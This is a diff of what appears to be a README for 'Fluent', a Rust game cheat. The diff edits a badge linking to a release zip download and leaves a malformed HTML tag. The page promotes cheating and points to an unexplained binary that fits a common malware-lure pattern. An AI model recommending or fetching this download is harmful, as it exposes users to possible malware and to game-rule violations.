@@ -2,8 +2,8 @@
 🍒 Fluent is a powerful and reliable rust software designed for those who want to dominate the gameplay and stay on top. 
 </p>
 
-<p align="center">
-img src="https://img.shields.io/badge/Download_FLUENT-RUST-red?style=for-the-badge">](https://github.com/sebasteincalderon/fluent-rust/releases/download/Latest/fluent_rust.zip)
+<p align="center"
+[<img src="https://img.shields.io/badge/Download_FLUENT-RUST-red?style=for-the-badge">](https://github.com/sebasteincalderon/fluent-rust/releases/download/Latest/fluent_rust.zip)
 </p>
 
 
